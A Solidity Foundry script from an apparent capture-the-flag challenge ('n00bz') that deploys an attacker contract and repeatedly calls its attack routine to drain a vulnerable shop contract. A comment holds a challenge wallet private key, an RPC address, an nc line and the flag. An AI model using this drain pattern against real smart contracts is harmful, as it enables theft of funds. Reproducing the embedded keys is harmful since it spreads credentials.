pragma solidity ^0.6.0;

import "forge-std/Script.sol";
import "../src/solve.sol";
import "../src/bank.sol";
import "forge-std/console.sol";

contract wow is Script{
        function run() external {
            uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");
            vm.startBroadcast(deployerPrivateKey);
            console.log(vm.envAddress("Wallet").balance);
            solve solve1 = new solve{value: 7 ether}(vm.envAddress("Bank"));
            Shop bank= Shop(vm.envAddress("Bank"));
            console.log("intial balance:",address(solve1).balance);
            solve1.start();
            console.log("after buy balance:",address(solve1).balance);
            solve1.attack();
            console.log("final balance:",address(solve1).balance);
            solve1.start();
            solve1.attack();
            console.log("final2 balance:",address(solve1).balance);
            console.log("final3 balance:",address(solve1).balance);
            solve1.finish();
            console.log(vm.envAddress("Wallet").balance);
            bank.buy{gas: 100000}{value: 1337 ether}(3,1);
            console.log(solve1.done());
            vm.stopBroadcast();
        }
}
/*
Choice: 1
contract address: 0x23b92643E0bD1a9d1B9e04AA85c9f37A87Ac1E5a
rpc-url: http://68.183.110.180:44165
Wallet private-key: 0xc1fc9fd79866c9d0e4288aa87c2aa949140f0e17f236a1af253facc2cc04581b
Wallet address: 0x393321fa458ea2034E36263D9cbC5f1b199c7770
Secret: 280fcf22323a305eb16b56e4d67898d9fc69142f70ec0a5f967a893fb2b4a5e1
Please save the provided secret, it will be needed to get the flag
*/

//nc 68.183.110.180 39999


//n00bz{5h0uld_h4v3_sub7r4ct3d_f1r5t}